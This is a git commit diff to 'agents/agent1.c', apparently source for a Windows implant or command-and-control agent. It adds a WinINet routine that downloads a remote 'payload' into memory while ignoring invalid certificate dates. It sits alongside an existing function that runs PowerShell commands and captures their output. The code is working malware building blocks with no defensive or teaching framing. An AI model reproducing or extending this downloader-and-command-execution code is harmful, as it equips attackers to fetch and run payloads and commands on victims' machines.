fec3131fcc2fc8f182ea965511b9d9fbc0e8bc96
XHOR <112668083+minder-security@users.noreply.github.com>
2025-04-03 03:26:42 +0200

    Update agent1.c

--- agents/agent1.c
+++ agents/agent1.c
@@ -3,8 +3,87 @@
 
 #define BUFFER_SIZE 4096
 
+// Function to handle internet connection
+BOOL InvokeUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
+
+	BOOL		bSTATE            = TRUE;
+
+	HINTERNET	hInternet         = NULL,
+			    hInternetFile     = NULL;
+
+	DWORD		dwBytesRead       = NULL;
+	
+	SIZE_T		sSize             = NULL;
+	PBYTE		pBytes            = NULL,
+			    pTmpBytes          = NULL;
+
+
+
+	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	if (hInternet == NULL){
+		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+
+	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	if (hInternetFile == NULL){
+		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (pTmpBytes == NULL){
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	while (TRUE){
+
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+
+		sSize += dwBytesRead;
+
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+		if (pBytes == NULL) {
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+		
+		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+		memset(pTmpBytes, '\0', dwBytesRead);
+
+		if (dwBytesRead < 1024){
+			break;
+		}
+	}
+	
+
+
+	*pPayloadBytes = pBytes;
+	*sPayloadSize  = sSize;
+
+_EndOfFunction:
+	if (hInternet)
+		InternetCloseHandle(hInternet);
+	if (hInternetFile)
+		InternetCloseHandle(hInternetFile);
+	if (hInternet)
+		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	if (pTmpBytes)
+		LocalFree(pTmpBytes);
+	return bSTATE;
+}
+
+
 // Function to execute PowerShell command and capture the output
-int ExecutePowerShellCommand(const char *command, char *outputBuffer, DWORD bufferSize)
+BOOL ExecutePowerShellCommand(const char *command, char *outputBuffer, DWORD bufferSize)
 {
     HANDLE hStdOutRead, hStdOutWrite;
     SECURITY_ATTRIBUTES saAttr;
@@ -88,7 +167,7 @@ int main()
     const char *command = "Get-Process";  // Example PowerShell command
 
     // Execute the PowerShell command and capture the output
-    int result = ExecutePowerShellCommand(command, ResBuf, sizeof(outputBuffer));
+    int result = ExecutePowerShellCommand(command, ResBuf, sizeof(ResBuf));
 
     if (result == 0)
     {
